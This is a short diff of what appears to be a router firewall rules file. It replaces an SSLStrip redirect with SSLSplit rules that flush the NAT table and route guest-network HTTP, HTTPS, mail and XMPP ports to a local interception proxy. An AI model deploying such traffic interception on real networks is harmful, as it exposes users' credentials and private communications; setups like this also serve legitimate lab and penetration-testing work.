@@ -6,5 +6,15 @@
 # put custom rules into the root chains e.g. INPUT or FORWARD or into the
 # special user chains, e.g. input_wan_rule or postrouting_lan_rule.
 
-# Send all trafic on the guest interface to SSLStrip
-iptables --table nat --append PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+# Send all trafic on the guest interface to SSLSplit
+
+# 8080 for non-SSL TCP connections such as HTTP, SMTP or FTP
+# 8443 for SSL connections such as SMTP over SSL, HTTPS, etc
+
+iptables -t nat -F
+iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080
+iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443
+iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443
+iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443
+iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443
+iptables -t nat -A PREROUTING -p tcp --dport 5222 -j REDIRECT --to-ports 8080
